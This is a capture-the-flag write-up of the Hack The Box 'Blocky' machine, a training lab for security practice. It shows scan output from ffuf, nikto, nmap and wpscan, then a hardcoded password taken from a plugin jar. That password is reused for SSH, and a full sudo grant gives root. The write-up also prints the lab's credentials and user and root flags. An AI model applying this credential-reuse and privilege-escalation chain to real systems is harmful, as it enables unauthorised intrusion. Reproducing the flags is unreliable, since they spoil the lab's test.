# Writeup
## Recon

### nmapAutomator

- The ffuf scan revealed some interesting paths that should be explored eventually

```
                        [Status: 301, Size: 0, Words: 1, Lines: 1]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
wiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
```

- nikto suggested some additional interesting tidbits, directory listing, and an exposed `/phpmyadmin`, which ffuf already found.

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.37
+ Target Hostname:    10.10.10.37
+ Target Port:        80
+ Start Time:         2021-08-12 12:56:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 8015 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-08-12 13:14:00 (GMT-4) (1064 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### rustscan

- I always run rustscan while running nmapAutomator, and it found an open port 25565, AKA the minecraft server port (could be interesting)

```
┌──(kali㉿kali)-[~/HTB/machines/blocky]
└─$ sudo rustscan -a 10.10.10.37 | tee rustscan.txt  

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.37:21
Open 10.10.10.37:22
Open 10.10.10.37:80
Open 10.10.10.37:25565
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 12:58 EDT
Initiating Ping Scan at 12:58
Scanning 10.10.10.37 [4 ports]
Completed Ping Scan at 12:58, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:58
Completed Parallel DNS resolution of 1 host. at 12:58, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:58
Scanning 10.10.10.37 [4 ports]
Discovered open port 25565/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Completed SYN Stealth Scan at 12:58, 0.15s elapsed (4 total ports)
Nmap scan report for 10.10.10.37
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2021-08-12 12:58:45 EDT for 0s

PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
           Raw packets sent: 8 (328B) | Rcvd: 7 (708B)
```

### Manual nmap vuln scan 

- Since nmapAutomator didn't do a full vuln scan (and ignored port 25565), I decided to do a manual nmap vuln scan on the exposed ports (don't really need to scan port 22 most of the time...)
- This scan found "notch" as a potential WordPress user. Fitting, to say the least. 

```
┌──(kali㉿kali)-[~/HTB/machines/blocky]                           
└─$ sudo nmap --script vuln 10.10.10.37 -p 80,21,25565      
[sudo] password for kali:                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 13:54 EDT
Nmap scan report for 10.10.10.37                                                                                      
Host is up (0.14s latency).                                                                                           
                                                                                                                      
PORT      STATE SERVICE                                    
21/tcp    open  ftp                                        
|_sslv2-drown:                                             
80/tcp    open  http                                       
| http-csrf:                                               
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.37
|   Found the following possible CSRF vulnerabilities: 
|                                                          
|     Path: http://10.10.10.37:80/                                                                                    
|     Form id: search-form-6115604f92d72                                                                              
|     Form action: http://10.10.10.37/                                                                                
|                                                                                                                     
|     Path: http://10.10.10.37:80/index.php/category/uncategorized/
|     Form id: search-form-6115605219680
|     Form action: http://10.10.10.37/                     
|                                                          
|     Path: http://10.10.10.37:80/wp-login.php                                                                        
|     Form id: loginform                                   
|     Form action: http://10.10.10.37/wp-login.php
|                                                                                                                     
|     Path: http://10.10.10.37:80/index.php/2017/07/                                                                  
|     Form id: search-form-61156058cfbe9                                                                              
|     Form action: http://10.10.10.37/                                                                                
|                                                                                                                     
|     Path: http://10.10.10.37:80/index.php/category/uncategorized/%5c%22
|     Form id: search-form-6115605ac168d                   
|     Form action: http://10.10.10.37/                                                                                
|                                                          
|     Path: http://10.10.10.37:80/wp-login.php?action=lostpassword
|     Form id: lostpasswordform                                                                                       
|     Form action: http://10.10.10.37/wp-login.php?action=lostpassword
|                                                          
|     Path: http://10.10.10.37:80/index.php/2017/07/%5c%22
|     Form id: search-form-6115605cd12dd
|_    Form action: http://10.10.10.37/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:                                               
|   /wiki/: Wiki                                           
|   /wp-login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin                               
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-slowloris-check:                                    
|   VULNERABLE:                                            
|   Slowloris DOS attack                                   
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|                                                          
|     Disclosure date: 2009-09-17
|     References:                                          
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection:                                      
|   Possible sqli for queries:
|     http://10.10.10.37:80/wp-includes/js/jquery/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.10.10.37:80/wp-includes/js/jquery/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.10.10.37:80/wp-includes/js/jquery/?C=S%3bO%3dA%27%20OR%20sqlspider
|_    http://10.10.10.37:80/wp-includes/js/jquery/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users:                                    
| Username found: notch                                    
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
25565/tcp open  minecraft
```

### wpscan 

- MORE RECON...

```
┌──(kali㉿kali)-[~/…/machines/blocky/]
└─$ wpscan --url http://10.10.10.37 | tee wpscan.txt

[+] URL: http://10.10.10.37/ [10.10.10.37]
[+] Started: Thu Aug 12 13:34:32 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups -: |=======================================================================================|

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

### Web enumeration

- Visiting the site shows a WordPress blog with a Minecraft theme

![7cacfa8986d02aced0a14f3ce94ae6ec.png](../../_resources/7cacfa8986d02aced0a14f3ce94ae6ec-1.png)

- The `/phpmyadmin` path reveals a phpmyadmin instance, and looking in the page source gives the version number away: 

![99a2cb8fc525c360b2bf6c3ec859692c.png](../../_resources/99a2cb8fc525c360b2bf6c3ec859692c-1.png)

- The `/wiki` path reveals that there may be Minecraft plugins stored somewhere on the server that may have credentials to some sort of database or something else

![5e3305cc7fbf46ff21e8c795c08e369d.png](../../_resources/5e3305cc7fbf46ff21e8c795c08e369d-1.png)

### Finding phpmyadmin credentials

- The `/plugins` path reveals the Minecraft plugins mentioned in the wiki, and after downloading `BlockyCore.jar` and extracting the file, we can see that the `com/myfirstplugin/BlockyCore.class` file has credentials!

![4f0cf1eaea797bbbcc4db894b07f480b.png](../../_resources/4f0cf1eaea797bbbcc4db894b07f480b-1.png)

```
┌──(kali㉿kali)-[~/…/machines/blocky/com/myfirstplugin]
└─$ strings BlockyCore.class 
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java

```

- Most likely, the `root:8YsqfCTnvxAUeduzjNSXe22` login is for phpmyadmin (because the default username is root), and indeed we can login to phpmyadmin with those credentials.

![e4da15e736ac37da1d1c792b13d56555.png](../../_resources/e4da15e736ac37da1d1c792b13d56555-1.png)


## Initial Access

### Credential reuse

- Let's not get ahead of ourselves, though. There was that "notch" user found during earlier recon, and trying `notch:8YsqfCTnvxAUeduzjNSXe22` in WordPress gives us an incorrect password error
- Still, remember that open port 22 for SSH? Trying the same credentials there gives us a user shell!

```
┌──(kali㉿kali)-[~/…/machines/blocky/com/myfirstplugin]
└─$ ssh notch@10.10.10.37                                                                                                                                                                                                             130 ⨯
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ 
```

- User flag done!

```
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5
```

## Privesc

### Absurd sudo privileges

- This is probably the most shocking part about this machine. Listing the sudo allowed commands reveals that the user `notch` can run ANYTHING as superuser, meaning instant root shell! Root flag done!

```
notch@Blocky:~$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su 
root@Blocky:/home/notch# cd /root
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
```

